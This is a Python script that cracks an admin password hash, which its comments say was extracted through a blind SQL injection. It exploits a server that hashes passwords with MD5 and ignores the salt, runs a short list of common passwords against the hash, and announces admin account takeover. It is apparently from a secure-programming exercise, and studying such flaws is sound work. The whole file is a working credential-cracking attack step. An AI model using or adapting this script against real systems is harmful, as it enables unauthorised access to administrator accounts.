#!/usr/bin/env python3
"""
MD5 CRACKING WITH EXTRACTED HASH
Use the hash extracted from blind SQL injection to crack the admin password.
"""

import asyncio
import hashlib
import base64
import time
from typing import List, Tuple

class RealMD5Cracker:
    def __init__(self):
        self.extracted_hash = "0ni2i8iVVA9sHXvHZL59sA.CY9rzUYh03PK3k6DJie09g"  # From SQL injection
        
    def decode_password_hash(self, stored_hash: str) -> Tuple[str, str]:
        """Decode the stored password hash format."""
        try:
            salt_b64u, hash_b64u = stored_hash.split(".")
            salt = base64.urlsafe_b64decode(salt_b64u + "==")  # Add padding
            password_hash = base64.urlsafe_b64decode(hash_b64u + "==")
            return salt, password_hash
        except Exception as e:
            print(f"Error decoding hash: {e}")
            return None, None
    
    def md5_hash_password(self, password: str, salt: bytes) -> bytes:
        """Hash a password using MD5 WITHOUT salt (matches server vulnerability)."""
        # The server ignores the salt completely - this is the vulnerability!
        return hashlib.md5(password.encode("utf-8")).digest()
    
    def generate_wordlist(self) -> List[str]:
        """Generate common passwords for testing."""
        return [
            # Common passwords
            "123456", "password", "123456789", "12345678", "12345",
            "admin", "root", "user", "guest", "test", "demo",
            "password123", "admin123", "root123", "test123",
            "qwerty", "letmein", "welcome", "hello", "world",
            # Names
            "alice", "bob", "charlie", "david", "eve",
            # Simple patterns  
            "111111", "000000", "123123", "654321",
            # Years
            "2023", "2022", "2021", "2020", "2019",
            # Application specific
            "socp", "secure", "programming"
        ]
    
    def crack_admin_password(self) -> str:
        """Crack the admin password using the extracted hash."""
        print("🎯 CRACKING ADMIN PASSWORD FROM EXTRACTED HASH")
        print("=" * 60)
        print(f"Extracted hash: {self.extracted_hash}")
        
        # Decode the hash
        salt, target_hash = self.decode_password_hash(self.extracted_hash)
        if not salt or not target_hash:
            print("❌ Failed to decode hash")
            return None
            
        print(f"Salt (hex): {salt.hex()}")
        print(f"Target hash (hex): {target_hash.hex()}")
        print()
        
        # Generate wordlist
        wordlist = self.generate_wordlist()
        print(f"📚 Testing {len(wordlist)} common passwords...")
        print()
        
        start_time = time.time()
        
        # Try each password
        for i, password in enumerate(wordlist):
            # Hash the password with the extracted salt
            candidate_hash = self.md5_hash_password(password, salt)
            
            if candidate_hash == target_hash:
                elapsed = time.time() - start_time
                print(f"🎉 PASSWORD CRACKED!")
                print(f"✅ Admin password: '{password}'")
                print(f"⏱️  Time taken: {elapsed:.3f} seconds")
                print(f"📊 Attempts: {i + 1}/{len(wordlist)}")
                return password
            
            if (i + 1) % 10 == 0:
                print(f"   Tried {i + 1}/{len(wordlist)} passwords...")
        
        elapsed = time.time() - start_time
        print(f"❌ Password not found in wordlist")
        print(f"⏱️  Total time: {elapsed:.3f} seconds")
        print(f"📊 Total attempts: {len(wordlist)}")
        return None

async def main():
    print("🔓 MD5 PASSWORD CRACKING WITH REAL EXTRACTED HASH")
    print("Using hash extracted from blind SQL injection attack")
    print("=" * 70)
    
    cracker = RealMD5Cracker()
    cracked_password = cracker.crack_admin_password()
    
    if cracked_password:
        print(f"\n🚨 SECURITY BREACH COMPLETE!")
        print(f"🔑 Admin credentials: admin / {cracked_password}")
        print(f"💀 Attacker can now login as admin with full access!")
    else:
        print(f"\n💡 Password not in common wordlist - try a larger dictionary")

if __name__ == "__main__":
    asyncio.run(main())